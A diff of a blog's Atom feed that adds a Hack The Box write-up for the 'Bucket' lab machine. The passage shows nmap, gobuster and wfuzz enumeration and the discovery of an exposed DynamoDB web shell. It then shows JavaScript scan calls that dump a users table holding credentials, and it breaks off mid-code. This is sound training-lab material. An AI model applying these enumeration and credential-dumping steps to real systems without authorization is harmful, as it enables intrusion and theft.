@@ -1,4 +1,455 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-03-31T00:32:11+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Ready</title><link href="/posts/HTB-Writeup-Ready" rel="alternate" type="text/html" title="HTB Writeup - Ready" /><published>2021-03-31T01:18:00+02:00</published><updated>2021-03-31T01:18:00+02:00</updated><id>/posts/HTB-Writeup:-Ready</id><content type="html" xml:base="/posts/HTB-Writeup-Ready">&lt;p&gt;A fun and well made box, where 80% of the time was spent enumerating and the remaining 20% split on easy foothold and root privesc.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-04-25T14:33:44+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Bucket</title><link href="/posts/HTB-Writeup-Bucket" rel="alternate" type="text/html" title="HTB Writeup - Bucket" /><published>2021-04-25T13:40:00+02:00</published><updated>2021-04-25T13:40:00+02:00</updated><id>/posts/HTB-Writeup:-Bucket</id><content type="html" xml:base="/posts/HTB-Writeup-Bucket">&lt;p&gt;&lt;img src=&quot;/assets/images/3f07dd46f3ff7d287d2f736b18c6ded7.png&quot; alt=&quot;3f07dd46f3ff7d287d2f736b18c6ded7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This my write-up for Bucket, a medium-difficulty Linux box completed on April 25th 2021, with acclaim from the community I should say; as it included technologies not often found in typical CTF, or so I cam e to understand.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;We start with our initial &lt;strong&gt;nmap&lt;/strong&gt; recon  scan: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sC -sV -oA nmap/bucket 10.10.10.212&lt;/code&gt;, which gives us pretty standard results:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-03-31 03:25 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.212
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.34 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We do notice nmap enumeration script telling us a redirect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;, which we add to our &lt;strong&gt;hosts&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;We start with standard web enumeration first.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---buckethtb&quot;&gt;Web Recon - bucket.htb&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-28-51.png&quot; alt=&quot;Screenshot_2021-03-31_03-28-51&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We start by running standard enumeration tools on the website and a few basic checks:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Check for robots.txt: none found.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Gobuster on root directory (raft-small-words): nothing interesting.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Check for languages being used.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Check source code: we do notice some SRC are pointing to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;:&lt;/p&gt;
+
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;coffee&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;s3.bucket.htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;adserver&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;images&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bug.jpg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;view-source:http:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;s3.bucket.htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;adserver&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;images&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bug.jpg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Bug&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;160&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Running the same &lt;strong&gt;gobuster&lt;/strong&gt; on this newly found sub-domain (After adding to our hosts file) with the same parameter as the first run , we find interesting findings:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$gobuster&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/Web-Content/raft-small-words.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/root &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.0.1
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://s3.bucket.htb
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     html,php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/03/31 03:42:21 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/health &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/shell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Additionally, before diving in the &lt;strong&gt;s3&lt;/strong&gt; server, we also search for potential additional subdomain with &lt;strong&gt;wfuzz&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://FUZZ.bucket.htb &lt;span class=&quot;nt&quot;&gt;--ip&lt;/span&gt; 10.10.10.212:80 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 302
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+Target: http://FUZZ.bucket.htb/
+Total requests: 19983
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                             
+=====================================================================
+000000247:   404        0 L      2 W        21 Ch       &quot;s3&quot;                                 000009543:   400        12 L     53 W       422 Ch      &quot;#www&quot;                               
+000010595:   400        12 L     53 W       422 Ch      &quot;#mail&quot;      
+
+Total time: 0
+Processed Requests: 19983
+Filtered Requests: 19980
+Requests/sec.: 0
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, s3 stands out, so we pivot on this subdomain.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---s3buckethtb&quot;&gt;Web Recon - s3.bucket.htb&lt;/h3&gt;
+
+&lt;p&gt;Accessing the &lt;em&gt;s3.bucket.htb&lt;/em&gt; site, we are shown a simple json message (which is strange considering this page was being registered as a 404):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-40-50.png&quot; alt=&quot;Screenshot_2021-03-31_03-40-50&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Following gobuster’s findings; we check for the &lt;strong&gt;/health&lt;/strong&gt; path which seems to show us which services are currently running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-31_03-53-33.png&quot; alt=&quot;Screenshot_2021-03-31_03-53-33&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;New information from this about the presence of &lt;strong&gt;dynamodb&lt;/strong&gt;, AWS database system. Next, visiting the &lt;strong&gt;/shell/&lt;/strong&gt; path , we are shown an interactive web shell for DynamoDB:&lt;/p&gt;
+
+&lt;p&gt;:warning: &lt;em&gt;Some time was lost here, as I omitted the trailing slash of the &lt;strong&gt;/shell&lt;/strong&gt; path given by gobuster, which redirected me to another location and never accessed the shell.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_17-40-40.png&quot; alt=&quot;Screenshot_2021-04-02_17-40-40&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;dynamodb-enumeration&quot;&gt;DynamoDB Enumeration&lt;/h2&gt;
+
+&lt;p&gt;The interactive shell provides some handy example and templates to use; reading through it, the first one of interest is the &lt;strong&gt;listTable&lt;/strong&gt; function which allows to to, as its name suggest, list tables:&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ExclusiveStartTableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// optional (for pagination, returned as LastEvaluatedTableName)&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;Limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// optional (to further limit the number of table names returned per page)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;listTables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which returns one table: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-04-36.png&quot; alt=&quot;Screenshot_2021-04-02_18-04-36&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, we use the &lt;strong&gt;describeTable&lt;/strong&gt; function to have more information about this table:&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;TableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;describeTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-06-32.png&quot; alt=&quot;Screenshot_2021-04-02_18-06-32&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which seem to contains credentials. Finally, we dump the content using the &lt;strong&gt;doScan&lt;/strong&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tableName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;TableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ALL_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// an error occurred&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// successful response&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// More data.  Keep calling scan.&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;LastEvaluatedKey&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ExclusiveStartKey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LastEvaluatedKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
